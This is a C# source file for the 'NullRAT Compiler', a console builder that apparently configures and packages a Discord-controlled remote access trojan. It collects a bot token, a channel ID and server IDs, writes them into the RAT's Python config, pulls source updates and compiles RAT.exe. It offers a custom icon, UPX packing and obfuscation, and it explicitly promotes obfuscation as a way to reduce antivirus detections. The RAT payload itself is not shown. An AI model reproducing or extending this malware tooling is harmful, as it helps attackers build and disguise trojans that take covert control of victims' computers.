﻿namespace NullRAT.Compiler
{
    public class MainActivity
    {
        public static void Main(string[] args)
        {
            #region Variables
            StringBuilder token = new();
            StringBuilder notif_cnn_id = new();
            StringBuilder serverIDCollection = new();
            RATVariables nullRATVars = new();

            string[] serverIDs;
            ulong tResult = 0;
            bool obfuscated = true;

            // Store some response data for the updater 
            RequestResponse updaterResponse = new();
            // ---------

            Regex token_match = new(
                @"[\w-]{24}\.[\w-]{6}\.[\w-]{27}", 
                RegexOptions.Compiled | RegexOptions.IgnoreCase
            );

            LockConsole.LockConsoleSizeXY();
            #endregion
            #region Presentation v2.0
            Console.Title = "NullRAT Compiler";
            Console.Clear(); Console.WriteLine();
            CenterText(" ███▄    █  █    ██  ██▓     ██▓     ██▀███   ▄▄▄     ▄▄▄█████▓", "#6A66FF");
            CenterText(" ██ ▀█   █  ██  ▓██▒▓██▒    ▓██▒    ▓██ ▒ ██▒▒████▄   ▓  ██▒ ▓▒", "#6A66FF");
            CenterText("▓██  ▀█ ██▒▓██  ▒██░▒██░    ▒██░    ▓██ ░▄█ ▒▒██  ▀█▄ ▒ ▓██░ ▒░", "#6A66FF");
            CenterText("▓██▒  ▐▌██▒▓▓█  ░██░▒██░    ▒██░    ▒██▀▀█▄  ░██▄▄▄▄██░ ▓██▓ ░ ", "#6A66FF");
            CenterText("▒██░   ▓██░▒▒█████▓ ░██████▒░██████▒░██▓ ▒██▒ ▓█   ▓██▒ ▒██▒ ░ ", "#6A66FF");
            CenterText("░ ▒░   ▒ ▒ ░▒▓▒ ▒ ▒ ░ ▒░▓  ░░ ▒░▓  ░░ ▒▓ ░▒▓░ ▒▒   ▓▒█░ ▒ ░░   ", "#6A66FF");
            CenterText("░ ░░   ░ ▒░░░▒░ ░ ░ ░ ░ ▒  ░░ ░ ▒  ░  ░▒ ░ ▒░  ▒   ▒▒ ░   ░    ", "#6A66FF");
            CenterText("   ░   ░ ░  ░░░ ░ ░   ░ ░     ░ ░     ░░   ░   ░   ▒    ░      ", "#6A66FF");

            AnsiConsole.Write(new Rule("[maroon]NullRAT Compiler[/]").LeftAligned());
            #endregion
            #region Verify src is present.
            if (!Directory.Exists(Environment.CurrentDirectory + "\\src\\"))
            {
                Console.WriteLine("\nThere isn't a valid NullRAT source folder, Exiting...");
                Thread.Sleep(2000);
                Environment.Exit(-1);
            }
            #endregion
            #region Check Updates and for a past Variables.py
            Thread updater = new(() => updaterResponse = CheckRATUpdate.CheckUpdate());

            AnsiConsole.Status().Start("Checking for Updates", ctx => {
                ctx.Spinner(Spinner.Known.Ascii).SpinnerStyle.Decoration(Decoration.Dim);
                Thread.Sleep(500);
                updater.Start();
                while (updater.IsAlive)
                { Thread.Sleep(5); }
            });

            if (InstanceData.UpdateAvailable)
            {
                Console.WriteLine();
                SlowPrintI("There has been an update in NullRAT's source, do you want to apply it? ", "green", false);

                if (AnsiConsole.Confirm("", true))
                {
                    Thread.Sleep(750);
                    // Write RAT.py source.
                    try
                    {
                        WriteFile.WriteRAT(updaterResponse).GetAwaiter().GetResult();
                        SlowPrintI("Update applied successfully!", "green", false);
                    }
                    catch
                    {
                        SlowPrintE("Failed to apply the update!", "maroon", false);
                    }
                    Console.WriteLine();
                }
            }
            if (File.Exists(Environment.CurrentDirectory + "/src/Variables.py"))
            {
                StreamReader sr = new(Environment.CurrentDirectory + "/src/Variables.py");
                string fileContent = sr.ReadToEnd();
                sr.Dispose();
                sr.Close();

                if (fileContent.Contains("# This file was auto-generated by NullRAT Compiler. DO NOT SHARE!"))
                {
                    if (AnsiConsole.Confirm("\nA previous configuration file was detected, do you want to see it's contents?"))
                    {
                        string[] splittedContent = fileContent.Split('\n');
                        for (int i = 0; i < splittedContent.Length; i++)
                        {
                            if (splittedContent[i].Contains("bot_token"))
                            {
                                string a = splittedContent[i].Split('=')[1].Replace('\"', ' ');
                                AnsiConsole.MarkupLine($"\nBot Token: {a.Trim()}");
                            }
                            else if (splittedContent[i].Contains("notification_channel"))
                            {
                                string b = splittedContent[i].Split('=')[1];
                                AnsiConsole.MarkupLine($"Notification Channel: {b.Trim()}");
                            }
                            else if (splittedContent[i].Contains("server_ids"))
                            {
                                string c = splittedContent[i].Split('=')[1].Replace('[', ' ').Replace(']', ' ');
                                AnsiConsole.MarkupLine($"Server IDs:{c}");
                            }
                        }
                        if (AnsiConsole.Confirm("\nDo you want to use this configuration file?"))
                        {
                            goto CompileNullRAT;
                        }
                    }
                } 
                else
                {
                    AnsiConsole.MarkupLine("[yellow][[WARN]] A previous configuration file was detected, but was invalidated.[/]");
                }
            }
            
            #endregion
            #region Get Bot_Token, Notification Channel ID and Server ID
            if (!InstanceData.UpdateAvailable)
                Console.WriteLine();
            while (true)
            {
                token.Append(
                    AnsiConsole.Prompt(
                new TextPrompt<string>("[white]Enter the[/] [yellow]bot token: [/]")
                    .PromptStyle("white")
                    .Secret()));

                if (!token_match.IsMatch(token.ToString()))
                {
                    AnsiConsole.MarkupLine("[red1]\nInvalid token!\n[/]");
                    token.Clear();
                } 
                else
                {
                    nullRATVars.Bot_Token = token;
                    break;
                }
            }

            while (true)
            {
                notif_cnn_id.Append(AnsiConsole.Prompt(
                new TextPrompt<string>("[white]Enter the [/][yellow]channel ID:[/] ")
                    .PromptStyle("white")));

                if (!ulong.TryParse(notif_cnn_id.ToString(), out tResult) || tResult.ToString().Length != 18)
                {
                    AnsiConsole.MarkupLine("[red1]\nA Channel ID doesn't have letters or special characters and has to be 18 chars long!\n[/]");
                    notif_cnn_id.Clear();
                }
                else
                {
                    nullRATVars.Notification_Channel_ID = tResult;
                    break;
                }
            }

            byte success = 0;

            while (true) 
            { 
                AnsiConsole.MarkupLine("\n[white]([/][yellow]Example:[/] [white]937923464709414922[yellow],[/]422814981520621569)[/]");
                
                serverIDCollection.Append(
                    AnsiConsole.Prompt(
                        new TextPrompt<string>("[white]Enter the [/][yellow]server IDs[/] [maroon]with commas:[/] ")
                            .PromptStyle("white")));

                if (serverIDCollection.ToString().Contains(','))
                    serverIDs = serverIDCollection.ToString().Split(',');
                else
                    serverIDs = serverIDCollection.ToString().Split(' ');

                for (int i = 0; i < serverIDs.Length; i++)
                {
                    if (!ulong.TryParse(serverIDs[i].ToString(), out tResult) || tResult.ToString().Length != 18)
                    {
                        AnsiConsole.MarkupLine($"[red1]\nServer ID(s) N{i+1} is invalid!\n[/]");
                        serverIDCollection.Clear();
                    }
                    else
                    {
                        nullRATVars.Server_IDs.Add(tResult);
                        success++;
                    }
                }

                if (success == serverIDs.Length)
                    break;
                else
                {
                    // When not all the IDs were successfully converted, clear the list of the previous vars.
                    nullRATVars.Server_IDs.Clear();    
                    success = 0;
                }
            }
            #endregion
            #region Save Variables To Variables.py

            Thread saveVars = new(() => WriteFile.WriteVariables(nullRATVars));

            AnsiConsole.Status().Start("Saving Variables", ctx => {
                            ctx.Spinner(Spinner.Known.Ascii).SpinnerStyle.Decoration(Decoration.Dim);
                            Thread.Sleep(500);
                            saveVars.Start();
                            while (saveVars.IsAlive)
                            { Thread.Sleep(5); }
                        });
            #endregion
            #region Compile NullRAT
            
            CompileNullRAT:
        
                Console.WriteLine();
                if (AnsiConsole.Confirm("\n[yellow]Do you want to add a custom icon to [red]NullRAT[/]?[/]\n"))
                {
                    InstanceData.MakeWithCIcon = true;
                }
                if (AnsiConsole.Confirm("\n[yellow]Do you want to compress the[/] [red]final executable?[/] [green](Recommended)[/]"))
                {
                    // Add UPX to Process PATH.
                    InstanceData.UseUPX = true;
                    Environment.SetEnvironmentVariable("PATH", Environment.GetEnvironmentVariable("PATH") + $@";{Environment.CurrentDirectory}\src\upx\");
                }

                Console.WriteLine();
                AnsiConsole.MarkupLine("[aqua bold]NOTE: Obfuscating [red bold]NullRAT[/] will decrease the amount of detections![/]");
                if (AnsiConsole.Confirm("[yellow]Do you want to obfuscate[/] [red]NullRAT[/]?"))
                {
                    Thread obfBuild = new(() => Compiler.MakeRAT.CompileRAT(InstanceData.MakeWithCIcon, true));

                    AnsiConsole.Status().Start("Building Obfuscated NullRAT", ctx => {
                            ctx.Spinner(Spinner.Known.Ascii).SpinnerStyle.Decoration(Decoration.Dim);
                            Thread.Sleep(500);
                            obfBuild.Start();
                        while (obfBuild.IsAlive)
                        { Thread.Sleep(5); }
                        });
                }
                else
                {
                    obfuscated = false;
                    Thread notObfBuild = new(() => Compiler.MakeRAT.CompileRAT(InstanceData.MakeWithCIcon, false));

                    Console.WriteLine();
                    AnsiConsole.Status().Start("Building Non-Obfuscated NullRAT", ctx => {
                            ctx.Spinner(Spinner.Known.Ascii).SpinnerStyle.Decoration(Decoration.Dim);
                            Thread.Sleep(500);
                            notObfBuild.Start();
                            while (notObfBuild.IsAlive)
                            { Thread.Sleep(5); }
                        });
                }
            #endregion
            #region Say Goodbye!

            if (obfuscated)
                AnsiConsole.MarkupLine($"Obfuscated [red]NullRAT[/] [yellow]v5[/] has been built to [yellow]{Environment.CurrentDirectory}\\RAT.exe[/]");
            else
                AnsiConsole.MarkupLine($"[red]NullRAT[/] [yellow]v5[/] has been built to [yellow]{Environment.CurrentDirectory}\\RAT.exe[/]");

            AnsiConsole.Markup("Exiting in 5 seconds");

            for (int i = 0; i < 3; i++)
            {
                Thread.Sleep(5000 / 3);
                AnsiConsole.Markup(".");
            }
            #endregion
        }
        
    }
}
